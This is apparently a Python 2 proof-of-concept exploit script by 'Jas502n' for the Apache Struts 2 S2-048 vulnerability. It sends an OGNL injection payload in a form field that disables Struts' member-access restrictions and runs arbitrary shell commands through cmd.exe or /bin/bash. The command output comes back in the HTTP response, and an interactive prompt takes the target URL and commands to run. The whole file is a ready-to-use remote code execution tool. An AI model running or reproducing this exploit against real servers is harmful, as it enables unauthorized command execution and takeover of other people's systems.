#!/usr/bin/python

# -*- coding: utf-8 -*-

'''

             ____ ____        ___  _  _    ___  
            / ___|___ \      / _ \| || |  ( _ ) 
            \___ \ __) |____| | | | || |_ / _ \ 
             ___) / __/_____| |_| |__   _| (_) |
            |____/_____|     \___/   |_|  \___/ 
                                   
 ____   ____ _____      _   _   _                  _    
|  _ \ / ___| ____|    / \ | |_| |_ _ __ __ _  ___| | __
| |_) | |   |  _|     / _ \| __| __| '__/ _` |/ __| |/ /
|  _ <| |___| |___   / ___ \ |_| |_| | | (_| | (__|   < 
|_| \_\\____|_____| /_/   \_\__|\__|_| \__,_|\___|_|\_\

                    Author By Jas502n

            https://github.com/jas502n/st2-048

            影响不大，周末注意休息，不要搞事情！
            
'''

import json,re
import requests
import threading
import urllib

def Poc(url,command):
    header = {'Content-Type': 'application/x-www-form-urlencoded'}
    poc = {"name":"%{(#szgx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' \
                          "+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())}","age":"1","__checkbox_bustedBefore":"true","description":"123123"}
    data = urllib.urlencode(poc)
    try:
        result = requests.post(url,data=data,headers=header)
        if result.status_code == 200:
            
            print result.content
    except requests.ConnectionError,e:
        print e

th = {"url":""}

while True:
    if th.get("url") != "":
        input_cmd = raw_input("cmd >>: ")
        if input_cmd == "exit":
            exit()
        elif input_cmd == 'set':
            url = raw_input("set url :")
            th['url'] = url
        elif input_cmd == 'show url':
            print th.get("url")
        else:
            Poc(th.get("url"),input_cmd)
    else:
        url = raw_input("set url :")
        th["url"] = url
